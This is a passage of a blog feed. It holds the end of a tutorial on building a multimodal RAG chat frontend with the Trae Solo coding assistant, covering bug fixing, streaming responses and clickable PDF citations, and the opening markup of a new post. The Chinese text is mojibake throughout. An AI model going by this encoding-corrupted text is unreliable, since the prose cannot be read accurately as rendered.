<p><strong>ç»“æ„åŒ–ç¼–ç </strong>ï¼šç¯å¢ƒå°±ç»ªåï¼ŒTrae å¼€å§‹æŒ‰ç…§è®¾å®šçš„è§„èŒƒç¼–å†™ä»£ç ã€‚ä»å…¶è¾“å‡ºçš„ä¸­é—´è¿‡ç¨‹å¯ä»¥çœ‹å‡ºï¼Œå®ƒæœ‰æ¡ä¸ç´Šåœ°åˆ›å»ºç›®å½•ã€ç¼–å†™ç»„ä»¶ï¼Œé€»è¾‘æ¸…æ™°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17b490febf9a469eb653fa448f96a55c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=1KrWLb2ZWNfpXUSN1LDmz1c8Lsc%3D" alt="1.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç”Ÿæˆé¡¹ç›®ç»“æ„</strong>ï¼šé¦–ç‰ˆä»£ç ç”Ÿæˆåï¼ŒæŸ¥çœ‹ç›®å½•ç»“æ„ï¼Œå®Œå…¨ç¬¦åˆä¹‹å‰çº¦å®šçš„è§„èŒƒã€‚è¯­ä¹‰åŒ–çš„æ–‡ä»¶å‘½åå’Œæ¨¡å—åŒ–ç»„ç»‡ï¼Œä½¿å¾—ä»£ç å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§å¾ˆé«˜ã€‚</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0a81f9ff220448593f2062044fd655b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=caqzlGFb%2FlNKFC8tXXgGL2%2BOZTs%3D" alt="8ã€.png" loading="lazy"/></p>
<h3 data-id="heading-9">2.4 Bugä¿®å¤ä¸åŠŸèƒ½æ·»åŠ </h3>
<p>å³ä¾¿æ˜¯ä¸€ä¸ªæ•°åƒè¡Œä»£ç çš„è§„èŒƒé¡¹ç›®ï¼Œ<strong>Trae Solo</strong>ä¹Ÿéš¾ä»¥ä¸€æ¬¡æ€§ç”Ÿæˆæ— bugä»£ç ã€‚æ­¤æ—¶ä¾¿éœ€è¦è¿ç”¨æŒ‡å—çš„ç¬¬ä¸‰æ­¥ï¼šç²¾å‡†çš„é—®é¢˜å®šä½ä¸å¼•å¯¼ä¿®å¤ã€‚</p>
<ol>
<li>
<p><strong>ç²¾å‡†å®šä½ä¿®å¤ Bug</strong>ï¼šä¾‹å¦‚ï¼Œåœ¨ PDF é¡µé¢é‡åˆ°äº†Â <code>Encountered two children with the same key</code>Â çš„é”™è¯¯ã€‚ä¸åº”ç®€å•ç²˜è´´æŠ¥é”™ï¼Œè€Œæ˜¯å°†<strong>é”™è¯¯ä¿¡æ¯</strong>ä¸ç–‘ä¼¼å‡ºé—®é¢˜çš„Â <strong><code>pdf.tsx</code>Â æ–‡ä»¶ä»£ç </strong>ä¸€åŒæä¾›ç»™ Traeï¼Œå¹¶å¼•å¯¼å…¶åˆ†æé—®é¢˜æ‰€åœ¨ã€‚è¿™ç§æä¾›ä¸Šä¸‹æ–‡çš„æ–¹å¼èƒ½æå¤§æé«˜ä¿®å¤æ•ˆç‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d55e102371114405a58cf8d5563f393f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=4OI%2FJi1nEp%2BbJazcx95D3PVWDoM%3D" alt="10.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68954e22d72e46b19b6092dfd73ac803~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=HPUS4QxGLUO%2BRlEZBQF1nolX%2FFE%3D" alt="9.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç¯å¢ƒç›¸å…³é”™è¯¯å¤„ç†</strong>ï¼šå¯¹äºå¦‚Â <code>localStorage is not defined</code>Â è¿™ç±»ä¸ç¯å¢ƒç›¸å…³çš„è¿è¡Œæ—¶é”™è¯¯ï¼ŒåŒæ ·é€šè¿‡æŒ‡æ˜é—®é¢˜çš„é¡µé¢å’Œä»£ç ç‰‡æ®µï¼Œå¼•å¯¼ Trae è¿›è¡Œæ¡ä»¶åˆ¤æ–­æˆ–å…¼å®¹æ€§ä¿®å¤ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7705dd2a689e460e8e0eb29ea3feac85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=jcLc9COgfiqSN%2Fs1PG4pt%2F0xgQE%3D" alt="11.png" loading="lazy"/></p>
</li>
<li>
<p><strong>åŠŸèƒ½è¿­ä»£ä¸è¡¥å……</strong>ï¼šåœ¨æ ¸å¿ƒåŠŸèƒ½æµ‹è¯•é€šè¿‡åï¼Œå‘ç°éœ€è¦è¡¥å……ä¸¤ä¸ªç‰¹æ€§ï¼š<strong>å¯¹è¯å†å²è®°å½•</strong>å’Œ<strong>PDFå¼•ç”¨å¯ç‚¹å‡»æº¯æº</strong>ã€‚å¯¹äºè¿™ç±»æ˜ç¡®çš„å°åŠŸèƒ½ç‚¹ï¼Œè¿™é‡Œç›´æ¥ç”¨è‡ªç„¶è¯­è¨€å‘ Trae æå‡ºéœ€æ±‚ï¼Œå®ƒä¼šé«˜æ•ˆåœ°å®ç°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f42e9b6744c9460c8576f437449ce216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=y9t6sRt8vQne16vJ%2BQFyFPXER0k%3D" alt="18.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24fe2156e6ee4557a5c8fa9f92629579~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=VuW3nLGZr58WnFoucy0ClP41dIY%3D" alt="17.png" loading="lazy"/></p>
</li>
</ol>
<h3 data-id="heading-10">2.5 æœ€ç»ˆæ•ˆæœ</h3>
<p>æ‰€æœ‰å¼€å‘ä¸è°ƒè¯•å®Œæˆåï¼ŒæŒ‡ç¤º Trae æ‰§è¡ŒÂ <code>npm run dev</code>Â å¯åŠ¨å¼€å‘æœåŠ¡å™¨ï¼Œå¯¹å„åŠŸèƒ½è¿›è¡Œé€ä¸€æµ‹è¯•ã€‚</p>
<p><strong>ç³»ç»Ÿé¦–é¡µ</strong>ï¼šæ¸…æ™°å±•ç¤ºå››ä¸ªåŠŸèƒ½å…¥å£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3378ac3d29b64491b84df6d5a359b71e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=SY8n0JSdd01TgDv%2Frn5YjkTVcvc%3D" alt="6.png" loading="lazy"/></p>
<p><strong>æ™ºèƒ½é—®ç­”ï¼š</strong> çº¯æ–‡æœ¬æµå¼å¯¹è¯ç•Œé¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7d193b076b04e089e4a7f572f3c42eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=%2B2NnU%2BYy0PNUpyhIRq%2FaLzaR%2FgE%3D" alt="12.png" loading="lazy"/></p>
<p><strong>å›¾ç‰‡åˆ†æï¼š</strong> æ”¯æŒä¸Šä¼ å›¾ç‰‡å¹¶ç»“åˆå›¾ç‰‡å†…å®¹è¿›è¡Œé—®ç­”ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e228ef2967343459c6dc8f68761e1fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=eeWqogGZS8SoiRA%2Bge5OatyJ524%3D" alt="13.png" loading="lazy"/></p>
<p><strong>éŸ³é¢‘è½¬å†™ï¼š</strong> æ”¯æŒä¸Šä¼ éŸ³é¢‘æ–‡ä»¶å¹¶åŸºäºå…¶å†…å®¹è¿›è¡Œäº¤äº’ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98391d9864f24faea6b9b78d3ff2d403~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=4y7rtu357gP6nFpGTcz4ejCEsCg%3D" alt="14.png" loading="lazy"/></p>
<p><strong>PDFè§£æå›ç­”ï¼š</strong> æ”¯æŒä¸Šä¼ PDFï¼Œæ¨¡å‹å›ç­”æ—¶æä¾›å¯ç‚¹å‡»çš„å¼•ç”¨æ¥æºï¼Œå®ç°æº¯æºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f05af9af5514f79a0465e02966e0851~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qpJpGl16wZz6uEUFki2sMTa28RI%3D" alt="15.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/169cd2885b52409185d07e6a485d4b56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=RVdOrawHksYNb%2BMW1kD%2FuYaaqIk%3D" alt="16.png" loading="lazy"/></p>
<h2 data-id="heading-11">ä¸‰ã€å‰ç«¯å…³é”®ä»£ç è§£æ</h2>
<p>åœ¨ Trae Solo çš„åŠ©åŠ›ä¸‹ï¼Œç¬”è€…å¿«é€Ÿè·å¾—äº†ä¸€ä¸ªåŠŸèƒ½å®Œæ•´çš„å‰ç«¯é¡¹ç›®ã€‚ç°åœ¨ç¬”è€…æ·±å…¥ä»£ç å†…éƒ¨ï¼Œå®¡è§†å¤§æ¨¡å‹ç”Ÿæˆçš„å®ç°ç»†èŠ‚ï¼Œå¹¶è§£æå¤§å®¶æœ€ä¸ºå…³æ³¨çš„å‡ ä¸ªæ ¸å¿ƒè®¾è®¡ã€‚</p>
<h3 data-id="heading-12">3.1 æ¨¡å—åŒ–æ¶æ„ä¸è·¯ç”±è®¾è®¡</h3>
<p><strong>æ ¸å¿ƒè®¾è®¡</strong>ï¼šé¡¹ç›®é‡‡ç”¨äº†æ¸…æ™°çš„åˆ†å±‚ä¸æ¨¡å—åŒ–æ¶æ„ï¼Œå……åˆ†ä½“ç°äº† React çš„æœ€ä½³å®è·µã€‚</p>
<ol>
<li>
<p><strong>è·¯ç”±å±‚ (<code>Home.tsx</code>)</strong> ï¼š<br/>
é¡¹ç›®ä½¿ç”¨Â <code>react-router-dom</code>Â (v7) ä½œä¸ºè·¯ç”±ç®¡ç†æ ¸å¿ƒã€‚<code>Home.tsx</code>Â ä½œä¸ºå¸ƒå±€ç»„ä»¶ï¼Œå®šä¹‰äº†ç³»ç»Ÿçš„æ•´ä½“å¯¼èˆªç»“æ„ã€‚å®ƒå°†å››ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼ˆæ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™ã€PDFè§£æï¼‰æ˜ å°„åˆ°ä¸åŒçš„è·¯ç”±è·¯å¾„ï¼Œå®ç°äº†åŠŸèƒ½æ¨¡å—çš„éš”ç¦»ä¸æŒ‰éœ€åŠ è½½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1b479b4cd0f466589c58da5046d9d6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=Mxgq7Liew7vlIlezTYPedmJAjyw%3D" alt="19.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç»„ä»¶å¤ç”¨ç­–ç•¥</strong>ï¼š<br/>
å°½ç®¡å››ä¸ªåŠŸèƒ½é¡µé¢ï¼ˆ<code>text.tsx</code>,Â <code>image.tsx</code>,Â <code>audio.tsx</code>,Â <code>pdf.tsx</code>ï¼‰åœ¨ UI å’Œäº¤äº’ä¸Šé«˜åº¦ç›¸ä¼¼ï¼Œä½† Trae Solo å¹¶æ²¡æœ‰ç®€å•å¤åˆ¶ä»£ç ï¼Œè€Œæ˜¯å·§å¦™åœ°è¿ç”¨äº†Â <strong>ç»„ä»¶ç»„åˆä¸å±æ€§é©±åŠ¨</strong>Â çš„è®¾è®¡æ¨¡å¼ã€‚å®ƒä»¬å…±ç”¨åŒä¸€ä¸ªæ ¸å¿ƒçš„Â <code>ChatPage</code>Â ç»„ä»¶ï¼Œé€šè¿‡ä¼ å…¥ä¸åŒçš„Â <code>props</code>ï¼ˆå¦‚Â <code>title</code>,Â <code>extraUploadComponent</code>,Â <code>apiEndpoint</code>Â ç­‰ï¼‰æ¥å®šåˆ¶åŒ–å„è‡ªçš„è¡Œä¸ºä¸ç•Œé¢ï¼Œæå¤§åœ°æå‡äº†ä»£ç çš„å¯ç»´æŠ¤æ€§å’Œå¤ç”¨æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19503dfbf8264e9d9d109a2d104cd10f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=P47UW%2B%2BWQOz6esu4zhRkxcVKajI%3D" alt="20.png" loading="lazy"/></p>
</li>
</ol>
<h3 data-id="heading-13">3.2 æµå¼å¯¹è¯äº¤äº’çš„å®ç°</h3>
<p><strong>æ ¸å¿ƒæŠ€æœ¯</strong>ï¼šå¯¹äºå¤§æ¨¡å‹é—®ç­”è¿™ç±»éœ€è¦å®æ—¶åé¦ˆçš„åœºæ™¯ï¼Œæµå¼è¾“å‡ºè‡³å…³é‡è¦ã€‚Trae Solo ç”Ÿæˆçš„ä»£ç ä¼˜é›…åœ°å®ç°äº†è¿™ä¸€åŠŸèƒ½ã€‚</p>
<ol>
<li>
<p><strong>çŠ¶æ€ç®¡ç†</strong>ï¼š<br/>
åœ¨Â <code>ChatPage/index.tsx</code>Â ä¸­ï¼Œä½¿ç”¨Â <code>useState</code>Â ç»´æŠ¤ä¸€ä¸ªÂ <code>messages</code>Â æ•°ç»„ï¼Œè¯¥æ•°ç»„å®æ—¶å­˜å‚¨å¹¶æ›´æ–°ç”¨æˆ·ä¸æ¨¡å‹ä¹‹é—´çš„å®Œæ•´å¯¹è¯è®°å½•ã€‚å†å²è®°å½•åœ¨<code>localstorage</code>ä¸­ï¼Œå½“ç„¶è¿™åªæ˜¯demo, çœŸå®ç”Ÿäº§ç¯å¢ƒä¸­å†å²è®°å½•è¦ä¿å­˜åœ¨æ•°æ®åº“ä¸­ã€‚</p>
</li>
<li>
<p><strong>æµå¼æ•°æ®è·å–ä¸æ¸²æŸ“</strong>ï¼š<br/>
å½“ç”¨æˆ·å‘é€æ¶ˆæ¯æ—¶ï¼Œå‰ç«¯ä¼šè°ƒç”¨å¯¹åº”çš„åç«¯æµå¼æ¥å£ã€‚æ ¸å¿ƒé€»è¾‘åœ¨äºä½¿ç”¨Â <code>fetch</code>Â API çš„Â <code>Response.body</code>Â è·å–ä¸€ä¸ªÂ <code>ReadableStream</code>ï¼Œå¹¶é€šè¿‡Â <code>reader</code>Â é€å— (<code>chunk</code>) è¯»å–æœåŠ¡å™¨æ¨é€çš„æ•°æ®ã€‚</p>
<ul>
<li><strong>å¢é‡æ›´æ–°</strong>ï¼šå½“åç«¯è¿”å›çš„æ•°æ®ç±»å‹ä¸ºÂ <code>content_delta</code>ï¼ˆå†…å®¹å¢é‡ï¼‰æ—¶ï¼Œä»£ç ä¼šç«‹å³æ›´æ–°å½“å‰æ­£åœ¨å›å¤çš„æ¶ˆæ¯å†…å®¹ï¼Œå®ç°æ–‡å­—çš„é€å­—è¾“å‡ºæ•ˆæœã€‚</li>
<li><strong>å®Œæˆå¤„ç†</strong>ï¼šå½“æ¥æ”¶åˆ°Â <code>message_complete</code>Â æ ‡è¯†æ—¶ï¼Œç»“æŸå½“å‰æ¶ˆæ¯çš„æµå¼æ¥æ”¶ï¼Œå¹¶å°†å®Œæ•´çš„æ¶ˆæ¯å¯¹è±¡å­˜å…¥Â <code>messages</code>Â çŠ¶æ€ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡äº¤äº’ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61764a41257a4be18a3ae21832a8cef6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qVb8KbBaWRv01oQ6iRIquxy%2F5Uw%3D" alt="21.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4d0ef77557043f1b5805b7e92da4d9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qSvksavw9RkS3lnNqtOtZbGWHsI%3D" alt="22.png" loading="lazy"/></p>
</li>
</ol>
<h3 data-id="heading-14">3.3 PDF å¼•ç”¨æº¯æºåŠŸèƒ½çš„å®ç°</h3>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼šè¿™æ˜¯ RAG ç³»ç»Ÿçš„å…³é”®ç‰¹æ€§ã€‚AI ä¸ä»…å›ç­”äº†é—®é¢˜ï¼Œè¿˜èƒ½æŒ‡æ˜ç­”æ¡ˆçš„æ¥æºã€‚</p>
<ol>
<li>
<p><strong>æ•°æ®ç»“æ„</strong>ï¼š<br/>
åç«¯åœ¨æµå¼å“åº”çš„æœ€åï¼Œä¼šè¿”å›ä¸€ä¸ªÂ <code>references</code>Â æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº†å¼•ç”¨çš„åŸæ–‡ç‰‡æ®µã€æ‰€åœ¨é¡µç ç­‰å…ƒæ•°æ®ã€‚</p>
</li>
<li>
<p><strong>å‰ç«¯æ¸²æŸ“ä¸äº¤äº’</strong>ï¼š<br/>
<code>ChatPage/index.tsx</code>Â åœ¨æ¥æ”¶åˆ°å®Œæ•´çš„æ¶ˆæ¯å’Œå¼•ç”¨æ•°æ®åï¼Œä¼šè°ƒç”¨Â <code>renderContentWithReferences</code>Â å‡½æ•°è¿›è¡Œå¤„ç†ã€‚è¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š</p>
<ul>
<li><strong>æ™ºèƒ½åŒ¹é…</strong>ï¼šå°†å›ç­”æ–‡æœ¬ä¸­æ ‡è®°çš„å¼•ç”¨å ä½ç¬¦ï¼ˆå¦‚Â <code>[1]</code>ï¼‰ä¸Â <code>references</code>Â æ•°ç»„ä¸­çš„å…·ä½“æ¡ç›®è¿›è¡Œå…³è”ã€‚</li>
<li><strong>å¯äº¤äº’æ¸²æŸ“</strong>ï¼šå°†æ™®é€šçš„æ•°å­—æ ‡è®°æ¸²æŸ“æˆ<strong>å¯ç‚¹å‡»çš„é“¾æ¥æˆ–æŒ‰é’®</strong>ã€‚</li>
<li><strong>æº¯æºå±•ç¤º</strong>ï¼šå½“ç”¨æˆ·ç‚¹å‡»å¼•ç”¨æ ‡è®°æ—¶ï¼Œé€šè¿‡å¼¹å‡ºæ¡†ï¼ˆModalï¼‰ã€ä¾§è¾¹æ æˆ–é«˜äº®ç­‰å½¢å¼ï¼Œå±•ç¤ºå¯¹åº”çš„åŸæ–‡ç‰‡æ®µå’Œå‡ºå¤„ï¼Œå®Œç¾å®ç°äº†â€œç­”æ¡ˆå¯è¿½æº¯ï¼Œæ¥æºå¯æŸ¥éªŒâ€çš„ RAG æ ¸å¿ƒä½“éªŒã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ede62764eec243dba7692e73e9a106ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=QzlffBxLSidkaGR9d3dw7MfNnfs%3D" alt="23.png" loading="lazy"/></p>
</li>
</ol>
<p>å…³äºè¯¥é¡¹ç›®çš„å…¨éƒ¨ä»£ç ï¼Œå¤§å®¶å¯å…³æ³¨ç¬”è€…çš„åŒåå¾®ä¿¡å…¬ä¼—å·Â <strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œå¹¶å›å¤<strong>LangChainæ™ºèƒ½ä½“å¼€å‘</strong>å³å¯è·å¾—ã€‚</p>
<h2 data-id="heading-15">å››ã€ æ€»ç»“</h2>
<p>æœ¬ç¯‡åˆ†äº«ç¬”è€…ç³»ç»Ÿæ€§åœ°å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨ Trae Soloï¼Œé«˜æ•ˆæ„å»ºå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„å‰ç«¯ç•Œé¢ï¼Œå®Œæˆäº†æ•´ä¸ªå…¨æ ˆåº”ç”¨çš„é—­ç¯ã€‚å›é¡¾æœ¬æ¬¡å®è·µï¼Œ ç¬”è€…ä¸ä»…æˆåŠŸè·å¾—äº†å¯ç”¨çš„å‰ç«¯é¡¹ç›®ï¼Œæ›´é‡è¦çš„æ˜¯ç³»ç»Ÿæ€»ç»“å¹¶éªŒè¯äº†ä¸€å¥—è¡Œä¹‹æœ‰æ•ˆçš„Â <strong>Vibe Coding æœ€ä½³å®è·µæŒ‡å—</strong>â€”â€”ä»ç¼–å†™ç»“æ„åŒ–çš„æç¤ºè¯ã€è¿›è¡Œæç¤ºè¯ä¼˜åŒ–ï¼Œåˆ°ç²¾å‡†å®šä½å’Œä¿®å¤é—®é¢˜ã€‚è¿™å¥—æ–¹æ³•è®ºæœ‰æ•ˆæå‡äº†å¤§æ¨¡å‹ç¼–ç¨‹çš„ç¡®å®šæ€§ä¸äº§å‡ºè´¨é‡ã€‚</p>
<p>è‡³æ­¤ï¼ŒåŸºäº LangChain 1.0 æ„å»ºå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„ç³»åˆ—æ ¸å¿ƒæ•™ç¨‹å·²å‘Šä¸€æ®µè½ã€‚ç„¶è€Œï¼Œæ™ºèƒ½ä½“ï¼ˆAgentï¼‰å¼€å‘é¢†åŸŸçš„æ¢ç´¢æ°¸æ— æ­¢å¢ƒã€‚åˆ«å¿˜äº†ï¼ŒLangGraph ä¹Ÿå·²æ­£å¼å‘å¸ƒ 1.0 ç‰ˆæœ¬ï¼Œå…¶å¼ºå¤§çš„å¤šæ™ºèƒ½ä½“ç¼–æ’èƒ½åŠ›å°†ä¸ºåº”ç”¨å¼€å‘æ‰“å¼€å…¨æ–°çš„æƒ³è±¡ç©ºé—´ã€‚æ­¤å¤–ï¼ŒLangChain å®˜æ–¹æ¨å‡ºçš„ deepAgents ç­‰æ¡†æ¶ï¼Œæ­£ä¸æ–­é™ä½ç€å¤æ‚æ™ºèƒ½ä½“ç³»ç»Ÿçš„å¼€å‘é—¨æ§›ã€‚ç¬”è€…å¯¹æ­¤å°†ä¸æ–­è·Ÿéšå¹¶ä¸€ç›´æ›´æ–°ä¸‹å»ï¼Œè®©å¤§å®¶æ¯ä¸ªäººéƒ½æŒæ¡æ™ºèƒ½ä½“å¼€å‘å¿…å¤‡æŠ€èƒ½ã€‚</p>
<p><a href="https://juejin.cn/column/7526240014499495972" title="https://juejin.cn/column/7526240014499495972" target="_blank">ã€Šæ·±å…¥æµ…å‡ºLangChain&amp;LangGraph AI Agent æ™ºèƒ½ä½“å¼€å‘ã€‹</a>ä¸“æ å†…å®¹æºè‡ªç¬”è€…åœ¨å®é™…å­¦ä¹ å’Œå·¥ä½œä¸­å¯¹ LangChain ä¸ LangGraph çš„æ·±åº¦ä½¿ç”¨ç»éªŒï¼Œæ—¨åœ¨å¸®åŠ©å¤§å®¶ç³»ç»Ÿæ€§åœ°ã€é«˜æ•ˆåœ°æŒæ¡ AI Agent çš„å¼€å‘æ–¹æ³•ï¼Œåœ¨å„å¤§æŠ€æœ¯å¹³å°è·å¾—äº†ä¸å°‘å…³æ³¨ä¸æ”¯æŒã€‚ç›®å‰å·²æ›´æ–°30è®²ï¼Œæ­£åœ¨æ›´æ–°å®æˆ˜ç¯‡å’ŒLangChain1.0å®æˆ˜é¡¹ç›®å¤šæ¨¡æ€RAGç³»ç»Ÿå¼€å‘ï¼Œå¹¶éšæ—¶è¡¥å……ç¬”è€…åœ¨å®é™…å·¥ä½œä¸­æ€»ç»“çš„æ‹“å±•çŸ¥è¯†ç‚¹ã€‚å¦‚æœå¤§å®¶æ„Ÿå…´è¶£ï¼Œæ¬¢è¿å…³æ³¨ç¬”è€…çš„æ˜é‡‘è´¦å·ä¸ä¸“æ ï¼Œä¹Ÿå¯å…³æ³¨ç¬”è€…çš„åŒåå¾®ä¿¡å…¬ä¼—å·Â <strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œæ¯æœŸåˆ†äº«æ¶‰åŠçš„ä»£ç å‡å¯åœ¨å…¬ä¼—å·ç§ä¿¡:Â <strong>LangChainæ™ºèƒ½ä½“å¼€å‘</strong>å…è´¹è·å–ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¨è GitHub ä¸Š 3 ä¸ª ç‰›ç‰›ç‰› Nano Banana Pro å¼€æºé¡¹ç›®ã€‚]]></title>    <link>https://juejin.cn/post/7580616979473498118</link>    <guid>https://juejin.cn/post/7580616979473498118</guid>    <pubDate>2025-12-08T03:47:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473498118" data-draft-id="7580621397972385801" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¨è GitHub ä¸Š 3 ä¸ª ç‰›ç‰›ç‰› Nano Banana Pro å¼€æºé¡¹ç›®ã€‚"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-12-08T03:47:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
